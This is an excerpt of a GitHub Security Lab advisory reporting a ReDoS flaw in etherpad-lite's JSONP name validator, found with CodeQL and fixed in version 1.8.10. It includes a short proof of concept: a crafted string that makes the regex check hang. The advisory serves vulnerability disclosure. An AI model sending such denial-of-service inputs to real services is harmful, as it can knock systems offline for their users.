<header class="post-header d-block mb-6">
      ...
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2020-359: ReDoS (Regular Expression Denial of Service) in etherpad-lite</h1>
...
<ul>
  ...
  <li>02/24/2021: issue resolved in https://github.com/ether/etherpad-lite/commit/0f16e518ff6c0a1edc33fd36fdc9d7ef3d3e732a</li>
  <li>02/25/2021: version 1.8.10 released</li>
</ul>
...
<p>Etherpad-lite is an online editor, that includes an online API.</p>

<p>This issue was detected using the <a href="https://lgtm.com/query/4622510433517703594/">following CodeQL query</a>.</p>

<p>We are mostly concerned about the result in <code class="language-plaintext highlighter-rouge">isValidJSONPName.js</code>, but others might also be worth fixing.</p>

<p>PoC:</p>
<ul>
  <li><code class="language-plaintext highlighter-rouge">git clone git@github.com:ether/etherpad-lite.git</code></li>
  <li>Run the below with <code class="language-plaintext highlighter-rouge">node</code>.
```JavaScript
var isJsonP = require(“./etherpad-lite/src/node/hooks/express/isValidJSONPName.js”);</li>
</ul>

<p>isJsonP.check(“$[‘a’][‘a’][‘a’][‘a’][‘a’][‘a’][‘a’][‘a’][‘a’][‘a’][‘a’][‘a’][‘a’][‘a’][‘a’][‘a’][‘a’][‘a’][‘a’][‘a’][‘a’][‘a’][‘a’][‘a’][‘a’][‘a’][‘a’][‘a’][‘a’][’”);
```</p>
...
<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference t